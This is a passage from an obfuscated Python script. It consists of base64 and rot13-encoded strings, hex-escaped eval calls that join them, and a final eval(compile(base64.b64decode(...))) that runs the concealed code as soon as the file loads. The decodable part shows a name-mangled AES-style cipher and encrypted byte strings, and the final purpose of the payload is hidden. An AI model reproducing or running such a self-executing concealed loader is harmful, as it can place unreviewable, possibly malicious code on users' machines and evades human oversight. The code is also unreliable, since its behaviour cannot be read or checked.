T08wICk6I2xpbmU6MjI0CiAgICAgICAgTzBPT08wTzAwME9PTzBPT08gPVtdI2xpbmU6MjI1CiAgICAgICAgZm9yIE9PTzBPMDAwT08wT09PTzBPICxPME9PTzBPT09PMDAwTzAwTyBpbiB6aXAgKE8wT09PTzBPME8wTzBPT09PICxPT09PME9PME8wMDAwME9PTyApOiNsaW5lOjIyNgogICAgICAgICAgICBPME9PTzBPMDAwT09PME9PTyAuYXBwZW5kIChPT08wTzAwME9PME9PT08wTyBeTzBPT08wT09PTzAwME8wME8gKSNsaW5lOjIyNwogICAgICAgIE9PTzAwME8wT08wTzBPTzBPIC5hcHBlbmQgKE8wT09PME8wMDBPT08wT09PICkjbGluZToyMjgKICAgIHJldHVybiBPT08wMDBPME9PME8wT08wTyAjbGluZToyMjkKX08wTzAwMDAwTzBPT08wME8wIC5pbnNlcnQgKDEgLGxpc3QgKHJldmVyc2VkIChbMjM1ICw3NSAsMTAgLDI1MyAsMTAzICw4MiAsNzcgLDExNSBdK19PMDAwMDAwTzBPT08wME8wICkpKSNsaW5lOjIzMgpPMDAwTzAwT08wT08wME9PTyA9JzJXa1x4YmJFRFx4ODJceDg0XHg5NE1ceGU0XHhkZS9ceGUwXHhhMC0nI2xpbmU6MjM2CmRlZiBfTzBPMDAwMDBPME9PT09PTzAgKE8wT09PT08wT08wT09PMDAwICk6I2xpbmU6MjM1CiAgICBPMDBPTzAwT09PT09PME9PMCA9T09PMDAwMDAwMDBPMDAwME8gKE9PTzAwMDAwMDAwTzAwMDAwICgpKSNsaW5lOjIzNwogICAgTzAwTzBPME9PTzBPMDAwT08gPU8wME9PMDBPT09PT08wT08wIC5PME8wTzAwTzBPMDBPT09PTyAoTzBPT09PTzBPTzBPT08wMDAgLE8wMDBPMDBPTzBPTzAwT09PICkuZGVjb2RlICgpI2xpbmU6MjM4CiAgICBPT09PMDAwTzBPTzBPTzBPMCA9J1xuJyNsaW5lOjIzOQogICAgT08wME8wMDBPME9PME9PME8gPWdldGF0dHIgKHN0ciAsZnVuYyApI2xpbmU6MjQxCiAgICBpZiAoLTB4OTg4ICstMHgxOGY2ICsweDIyODAgKSUyICE9MCA6I2xpbmU6MjQyCiAgICAgICAgTzBPME9PT09PT08wMDAwMDAgPVtdI2xpbmU6MjQzCiAgICAgICAgZm9yIE9PTzBPTzAwMDBPME9PT08wIGluIE8wTzBPMDBPTzBPTzBPMDAwKE8wMDAwMDAwTzAwME8wTzAwICk6I2xpbmU6MjQ0CiAgICAgICAgICAgIE8wTzBPT09PT09PMDAwMDAwIC5hcHBlbmQgKE9PMDBPMDAwTzBPTzBPTzBPIChPMDBPME8wT09PME8wMDBPTyAsT09PTzAwME8wT08wT08wTzAgKVs6MHhmMzEgKy0weDQwOCArLTB4YjI4IF0pI2xpbmU6MjQ1CiAgICAgICAgcmV0dXJuIE9PT08wMDBPME9PME9PME8wIC5qb2luIChPME8wT09PT09PTzAwMDAwMCApI2xpbmU6MjQ2CiAgICBlbHNlIDojbGluZToyNDcKICAgICAgICBPME8wT09PT09PTzAwMDAwMCA9W10jbGluZToyNDgKICAgICAgICBPMDAwME8wME8wMDBPTzAwTyA9T08wME8wMDBPME9PME9PME8gKE8wME8wTzBPT08wTzAwME9PICxPT09PMDAwTzBPTzBPTzBPMCApI2xpbmU6MjQ5CiAgICAgICAgZm9yIE9PTzBPTzAwMDBPME9PT08wIGluIE8wTzBPMDBPTzBPTzBPMDAwKE8wMDAwMDAwTzAwME8wTzAwICk6I2xpbmU6MjUwCiAgICAgICAgICAgIE8wTzBPT09PT09PMDAwMDAwIC5hcHBlbmQgKGcgKE8wMDAwTzAwTzAwME9PMDBPICkpI2xpbmU6MjUxCiAgICAgICAgcmV0dXJuIE8wTzBPT09PT09PMDAwMDAwICNsaW5lOjI1MgpfX2FsbF9fID0gW08wME8wME9PT09PMDAwME9PKE8wMDBPMDBPTzBPTzAwT09PLCAnXHg4MVx4ODfCusOrXHg5NFx4OTPDkcK0w4R9My1+XHgxMMOQXWInKV0KZGVmIF9PME8wTzAwME9PME9PTzBPMCAoTzBPME9PTzAwMDAwTzBPTzAgLE9PTzBPME8wMDAwME9PT08wID0xNiApOiNsaW5lOjI1NQogICAgIiIjbGluZToyNjIKICAgIE8wTzAwTzBPME9PT09PT08wID1PT08wTzBPMDAwMDBPT09PMCAtKGxlbiAoTzBPME9PTzAwMDAwTzBPTzAgKSVPT08wTzBPMDAwMDBPT09PMCApI2xpbmU6MjYzCiAgICByZXR1cm4gTzBPME9PTzAwMDAwTzBPTzAgK2J5dGVzIChbTzBPMDBPME8wT09PT09PTzAgXSpPME8wME8wTzBPT09PT09PMCApI2xpbmU6MjY0CmRlZiBfTzBPTzBPME8wTzAwTzAwME8gKE9PME9PME9PTzBPT09PME9PICk6I2xpbmU6MjY3CiAgICAiIiNsaW5lOjI3MwogICAgcmV0dXJuIE9PME9PME9PTzBPT09PME9PIFs6LU9PME9PME9PTzBPT09PME9PIFstMSBdXSNsaW5lOjI3NApOVU1fUk9VTkRTID17MTYgOjExICwyNCA6MTMgLDMyIDoxNiB9I2xpbmU6Mjc3Ck5VTV9XT1JEUyA9ezE2IDo0ICwyNCA6NiAsMzIgOjggfSNsaW5lOjI3OApJbnZfX08wTzAwMDAwTzBPT08wME8wIFtSIF1bSSBdPTB4NWEgI2xpbmU6MjgwCl9PMDAwMDAwTzAwME8wME8wMSA9Jy5PQ1xyXHhhN1NceDAwXHg5Zlx4ZTBceGMyU25ceDA3XHgxNVx4OTZceGRjcVx4YTEhXHgwMVx4MWU/XHg5Ylx4ZDBceDg3NVx4MTlceDBjXHg4Y1x4YzFxTScjbGluZToyODIKX08wMDAwMDBPMDAwTzAwTzAyID0nXHhhN1x4MDBceDAzXHhkZlx4ODdceGEzKFx4OGFceGE5clx4ZWRceGIxXHhkMzdceGNiXHg5Ylx4YjNGPVx4MWZoNVx4YjRfRi1ceGM0XHhjMXxceGFmZTsnI2xpbmU6MjgzCl9PMDAwMDAwTzAwME8wME8wMyA9J1x4MGU5b1x4YWZceDlhXHhmNlx4YjlceDljY1x4ZmNdalx4MTdceDhkXHgxOGpceGIxL1x4YjNceGNjLy1ceDgxXHhlNlxcXHhkNVx4ZDRceDE2XHg4MFx4OTg0XHgxZCcjbGluZToyODQKX08wMDAwMDBPMDAwTzAwTzA0ID0nZCt+XHhhM1x4YjFjXHhiOFx4MDBceDgyXHgxN1x4ZmVcdFx4MGMkenctXHgxY1x4YTZceDljMVx4ZjE3XHhhNlx4YjVceGY2XHhhYWdceDBjW1x4YmZ+JyNsaW5lOjI4NQpfTzAwMDAwME8wMDBPMDBPMDUgPSInfVpceGYxXHhiOSNceDgxXHhmNmtceGJhXHgxMzMoXHhmZFx4MWRceGE0R1x4ZDBceDFhIVx4MTVceDk3XHg3Zlx4YjJceGE3b1x4YjNceDkzW1x4MTFGfSIjbGluZToyODYKY2xhc3MgT09PMDAwMDAwMDBPMDAwME8gOiNsaW5lOjI4OQogICAgZGVmIF9faW5pdF9fIChPT08wMDBPT09PT08wME8wTyAsTzBPME8wMDAwT09PMDAwME8gLE8wMDAwT08wT09PTzAwT09PID1DQkMgKTojbGluZToyOTAKICAgICAgICBpZiBsZW4gKE8wTzBPMDAwME9PTzAwMDBPIC'; destiny = 'yho3DtnJ4tGyIAK1WCIH5RHlN6V2kcozH6ZwxkPvNtVPNtVPNtVPNtVUWunKAyVSMuoUIyEKWlo3VtXPWCozk5VQRlBPjtZGxlVTShMPNlAGLtLzy0VTgyrKZtLKWyVUA1pUOipaEyMPRvXFAfnJ5yBwV5ZtbtVPNtVPNtVTyzVR8jZQNjG08jG09CGmNjG09CVPR9D0WQVTShMPOCZQNjZR9CZR9CG08jZR9CGlNuCHIQDvN6V2kcozH6Zwx0PvNtVPNtVPNtVPNtVUWunKAyVSMuoUIyEKWlo3VtXPWIoaA1pUOipaEyMPOgo2EyVFVcV2kcozH6Zwx1PvNtVPNtVPNtG09CZQNjG09CG09CZQOCZR8tYz5vVQ00VPAfnJ5yBwV5AjbtVPNtVPNtVR9CGmNjZR9CG09CGmNjGmOCVP5hnlN9GyIAK1qCHxEGVSgfMJ4tXR8jGmOCZQNjZR9CGmNjZQOCVPyqV2kcozH6Zwx4PvNtVPNtVPNtG09CZQNjG09CG09CZQOCZR8tYz5lVQ1BIH1sHx9IGxEGVSgfMJ4tXR8jGmOCZQNjZR9CGmNjZQOCVPyqV2kcozH6Zwx5PvNtVPNtVPNtG09CZQNjG09CG09CZQOCZR8tYz1iMTHtCH8jZQNjG08jG09CGmNjG09CVPAfnJ5yBwZjZNbtVPNtVPNtVR9CGmNjZR9CG09CGmNjGmOCVP5voT9wn19fMJ5aqTttCGR2VPAfnJ5yBwZjZDbtVPNtVPNtVR9CGmNjZR9CG09CGmNjGmOCVP5lo3IhMS9eMKymVQ1CG08jZQOCG09CG08jZR8jGlNhK2I4pTShMS9eMKxtXR8jGmOCZQNjZR9CGmNjZQOCVPxwoTyhMGbmZQVXVPNtVTEyMvOsMKujLJ5xK2gyrFNbG09CGmOCGmOCZQNjGmOCZQNtYR9CZR8jG09CG09CZR9CZQNjVPx6V2kcozH6ZmN0PvNtVPNtVPNtVvVwoTyhMGbmZGNXVPNtVPNtVPOCG08jG08jZQOCG08jZR9CZPN9J10woTyhMGbmZGRXVPNtVPNtVPOzo3VtG09CZQOCZR9CGmNjZQNjGmNtnJ4tGmOCZR8jZR9CZR9CZR8jZQNbG09CGmOCGmOCZQNjGmOCZQNtYz5eVPx6V2kcozH6ZmRlPvNtVPNtVPNtVPNtVR9CGmOCGmNjZR9CGmNjG08jVP5upUOyozDtXSgCGmOCZR9CG09CGmOCGmNjZPOoAPNdG09CZQOCZR9CGmNjZQNjGmNtKFkCGmOCZR9CG09CGmOCGmNjZPOoAPNdG09CZQOCZR9CGmNjZQNjGmNtXmRtKFkCGmOCZR9CG09CGmOCGmNjZPOoAPNdG09CZQOCZR9CGmNjZQNjGmNtXmVtKFkCGmOCZR9CG09CGmOCGmNjZPOoAPNdG09CZQOCZR9CGmNjZQNjGmNtXmZtKI0cV2kcozH6ZmRmPvNtVPNtVPNtMz9lVR9CGmNjGmOCG08jZQNjZR8jVTyhVR8jGmOCZQOCGmOCGmOCZQNjXR9CG08jG08jGmNjZR8jGmNjVP5hnlNfXR9CG08jG08jGmNjZR8jGmNjVP5hLvNdXR9CG08jG08jGmNjZR8jGmNjVP5hpvNeZFNcXFx6V2kcozH6ZmR1PvNtVPNtVPNtVPNtVR8jZR8jZR8jGmNjGmNjZQOCVQ1CG08jG08jZQOCG08jZR9CZPOoG09CZQOCZR9CGmNjZQNjGmNtYGRtKFAfnJ5yBwZkAtbtVPNtVPNtVPNtVPOcMvOCG08jZR8jG09CZQNjZQOCZPNyG09CGmOCGmOCZQNjGmOCZQNtYz5eVQ09ZPN6V2kcozH6ZmR3PvNtVPNtVPNtVPNtVPNtVPOCZQOCZQOCZR8jZR8jZQNjGlN9K09CZR8jZR9CZQNjZQOCZR8jVPuCZQOCZQOCZR8jZR8jZQNjGlNfHzAiovOonJ50VPuCG08jZR8jG09CZQNjZQOCZPNiG09CGmOCGmOCZQNjGmOCZQNtYz5eVPxgZFOqXFAfnJ5yBwZkBNbtVPNtVPNtVPNtVPOyoTyzVR9CG08jG08jGmNjZR8jGmNjVP5hnlN+AvOuozDtG09CZQOCZR9CGmNjZQNjGmNtWH9CG08jG08jGmNjZR8jGmNjVP5hnlN9CH9CG08jG08jGmNjZR8jGmNjVP5hLvN6V2kcozH6ZmR5PvNtVPNtVPNtVPNtVPNtVPOCZQOCZQOCZR8jZR8jZQNjGlN9K08jGmNjG08jZQOCGmNjG08jVPuoGmNjGmNjGmOCZQOCZQNjZR8tKFksGmOCZQNjZQOCZR9CGmNjGmNtXIfjVS0woTyhMGbmZwNXVPNtVPNtVPNtVPNtG09CZR9CZQNjG09CZQOCGmNtYzSjpTIhMPNbJ09CZR8jZR8jZQNjZR8jGmNjVS5CGmNjG09CZQOCG08jGmNjGlOzo3VtG08jGmNjGmNjZQNjGmOCZQNtYR9CZQOCG08jZR9CGmOCZQOCVTyhVUccpPNbG09CZR9CZQNjG09CZQOCGmNtJ09CGmNjGmOCG08jZQNjZR8jVP1CG09CZR9CZR8jZQOCZR8jZPNhozftKFkCZQOCZQOCZR8jZR8jZQNjGlNcKFxwoTyhMGbmZwRXVPNtVPNtVPOlMKE1pz4toTymqPNbrzyjVPtdJ2y0MKVtXR9CGmOCGmNjZR9CGmNjG08jVPyqXx9CG08jG08jGmNjZR8jGmNjVP5hLvNcXFAfnJ5yBwZlZtbtVPNtMTIzVR8jGmOCZQOCZR8jZR9CG09CVPuCZR8jGmNjG09CZQOCG09CGlNfG08jG09CZQOCG09CGmNjGmNtYR8jG09CG08jZQOCGmNjZR8jVQ1Bo25yVPx6V2kcozH6ZmxlPvNtVPNtVPNtVvVwoTyhMGb0ZQNXVPNtVPNtVPOCZQOCZQNjZR8jGmOCG09CGlN9oTymqPNbK08jZQNjZQOCGmOCG08jG09CVPufnKA0VPuCGmOCG08jZR9CG09CZQOCZPNcYR8jGmOCZQOCG08jZR9CG09CVP5voT9wn19fMJ5aqTttXFxwoTyhMGb0ZQRXVPNtVPNtVPOCGmOCZQNjZQOCG08jGmNjGlN9GmOCZR8jZR9CGmNjG09CG08tYx8jGmOCZQOCZR8jZR9CGmOCVPuCZQOCZQNjZR8jGmOCG09CGlNfGmOCG09CGmNjZR9CZQNjGmNtXJyzVR8jGmOCZQOCG08jZR9CG09CVP5go2EyVQ09D0WQVTIfp2HtGmOCZR8jZR9CGmNjG09CG08tYx8jGmOCZQOCZR8jZR9CGmNjVPuCZQOCZQNjZR8jGmOCG09CGlNcV2kcozH6AQNlPvNtVPNtVPNtpzI0qKWhVS9CZR9CZR8jGmOCZQOCZQNjGlNbG08jGmNjZQNjG09CZR8jZR8tXFAfnJ5yBwDjZjbtVPNtMTIzVR8jGmOCZQOCZR8jZR9CGmOCVPuCZQOCZQNjG09CZR8jG09CZPNfG08jG08jGmOCGmNjZR9CZR8tYR8jGmOCZQNjGmOCG08jGmNjVPx6V2kcozH6AQN1PvNtVPNtVPNtVvVwoTyhMGb0ZGRXVPNtVPNtVPOCGmOCGmOCZR9CZQNjG08jGlN9J08jGmOCZQNjGmOCG08jGmNjVS0eG08jG08jGmOCGmNjZR9CZR8tV2kcozH6AQRlPvNtVPNtVPNtGmOCG08jZR8jG09CZR8jGmNtCIgqV2kcozH6AQRmPvNtVPNtVPNtGmNjZR9CZQOCG09CG09CZQNtCGRtV2kcozH6AQR0PvNtVPNtVPNtq2ucoTHtGmNjZR9CZQOCG09CG09CZQNtCTkyovNbG08jG08jGmOCGmNjZR9CZR8tXGbwoTyhMGb0ZGHXVPNtVPNtVPNtVPNtG08jZR8jGmOCGmNjZR9CZQNtCH9CZR9CZR8jG08jZQOCGmOCVSfgGmNjZR9CZQOCG09CG09CZQNtKFAfnJ5yBwDkAtbtVPNtVPNtVPNtVPOCGmNjGmOCZR9CZQNjG08jZPN9GmNjGmNjZR9CGmOCZR9CGmNtYx8jGmOCZQOCZR8jZR9CZQOCVPuCGmNjGmOCZR9CZQNjG08jZPNcV2kcozH6AQR3PvNtVPNtVPNtVPNtVR9CZQOCZR8jG08jZQOCGmNjVQ1vrKEyplNbJ08jZQOCZQOCG09CZR8jZR9CVS5CZQNjGmOCZR9CG09CG09CGlOzo3VtGmNjZR8jZR9CG08jGmNjG08tYR8jZQOCZR8jG09CG09CG09CVTyhVUccpPNbG08jZR8jGmOCGmNjZR9CZQNtYR9CZR9CZR8jG08jZQOCGmOCVSfgXR8jZQOCGmNjG09CG09CGmNjVPfkVPyqXI0cV2kcozH6AQR4PvNtVPNtVPNtVPNtVR8jG09CZQOCZR9CGmOCZR8jVQ1oG08jZR8jGmOCGmNjZR9CZQNtKFgCZR9CGmNjGmOCG08jGmOCZPNwoTyhMGb0ZwNXVPNtVPNtVPNtVPNtGmNjZR9CZQOCG09CG09CZQNtXm0kVPAfnJ5yBwDlZDbtVPNtVPNtVUWyqUIlovOvWlphnz9covNbGmOCG08jZR8jG09CZR8jGmNtXFAfnJ5yBwDlZjbtVPNtMTIzVR8jGmOCZQOCZR8jZR9CGmNjVPuCZQOCG08jZQNjZQOCZQNjZPNfG08jGmOCGmNjGmOCZR9CGmNtXGbwoTyhMGb0ZwHXVPNtVPNtVPNvVvAfnJ5yBwDmZNbtVPNtVPNtVUWyqUIlovOvWlphnz9covNbJ08jZR9CGmNjZQNjZR8jZQNjVP5CZR8jGmNjGmOCZQOCGmNjGlNbGmOCGmOCGmNjZQNjG08jGmNtXJMipvOCZR9CZR9CZQNjZQOCGmOCZPOcovOCGmOCZR9CZQOCZR8jG09CZPOqXFAfnJ5yBwDmZDbtVPNtMTIzVR8jGmOCZQOCZR8jZR9CZQOCVPuCG09CGmNjGmNjZQOCG09CGlNfGmOCGmNjGmNjGmOCZR8jGmNtXGbwoTyhMGb0ZmZXVPNtVPNtVPNvVvAfnJ5yBwDmBDbtVPNtVPNtVR9CZQOCZR8jG09CG08jG08jVQ1sG08jG09CG08jZQNjZR8jZQNtXTkcp3DtXR8jG08jZR8jZR8jGmOCZR8jVPxfAPNcV2kcozH6AQDjPvNtVPNtVPNtG08jZR8jGmOCG09CGmOCGmNtCI9CZR8jZQNjZR9CG09CG09CZPNbG08jZR8jGmOCG09CGmOCGmNtYR9CG09CZQOCZQNjZR9CG09CVP5lo3IhMS9eMKymVSfgZFOqXFAfnJ5yBwD0ZDbtVPNtVPNtVTMipvOCG09CGmOCZQOCGmNjG08jZPOcovOCZR8jGmNjG08jG08jGmNjZPuCG09CGmNjGmNjZQOCG09CGlNhoaVtYGRtYQNtYP0kVPx6V2kcozH6AQDmPvNtVPNtVPNtVPNtVR9CZQOCZR8jG09CG08jG08jVQ1sG09CGmNjGmNjG08jGmNjZR8tXR9CZQOCZR8jG09CG08jG08jVPkCG09CGmNjGmNjZQOCG09CGlNhpz91ozEsn2I5plOoG09CG08jGmNjG08jZR9CZQNtKFxwoTyhMGb0AQDXVPNtVPNtVPOCGmNjGmOCZR9CG09CZR9CZPN9K09CZR8jGmOCZQOCZR9CZQOCVPuCGmNjGmOCZR9CG09CZR9CZPNcV2kcozH6AQD2PvNtVPNtVPNtG08jZR8jGmOCG09CGmOCGmNtCI9CZR8jZR9CZQNjG08jZR9CZPNbG08jZR8jGmOCG09CGmOCGmNtYRyhqy9sGmOCZQNjZQOCZR9CGmNjGmNtXFAfnJ5yBwD0AjbtVPNtVPNtVR9CZQOCZR8jG09CG08jG08jVQ1sGmOCZQNjZQOCG09CG09CGmNtXR9CZQOCZR8jG09CG08jG08jVPkCG09CGmNjGmNjZQOCG09CGlNhpz91ozEsn2I5plOoZPOqXFAfnJ5yBwD0BNbtVPNtVPNtVR9CZQOCZR8jG09CG08jG08jVQ1vrKEyplNboTymqPNbG09CZR8jZR9CZR9CZR8jZQNtXPcCGmNjGmOCZR9CG09CZR9CZPNcXFxwoTyhMGb0AGNXVPNtVPNtVPOlMKE1pz4tG08jZR8jGmOCG09CGmOCGmNtV2kcozH6AQHkPyttCI9CZQNjZQNjGmNjZR8jZR8jAPOoZUuvAFNeYGO4ZlNdZUuwZ2RtXmO4ZwDjBPN6ZUuwBGNtXl0jrQV2MwVtXmO4ZJR3ZFNeAPNdZvNeYGO4LJLkVPfjrQR4LGDtXl0jrQSvAvNdZUt4VS0woTyhMGb0AGDXJFN9ZGNtYGttV2kcozH6AQH1PzEyMvOCG08jZQNjZQNjZR8jZQNjZPNbXGbwoTyhMGb0AGtXVPNtVUWyqUIlovOsGmNjZQNjZR8jZQOCZQOCZQVtJmbgZUtkAGqxVPfjrQptXwO4LGZtXmO4ZGRkZPOqX1ttX19CZQNjZQNjGmNjZR8jZR8jAFOoJFNiYmVtBwZtXvblVS0eK08jZQNjZQOCZQNjGmNjGmNkVSfjrTLtBwO4ZGVtKFgsGmNjZQNjZR8jZQOCZQOCZQZtJmblVS0woTyhMGb0AGxX'; joy = '\x72\x6f\x74\x31\x33'; trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29'); eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')), '<string>', 'exec'))
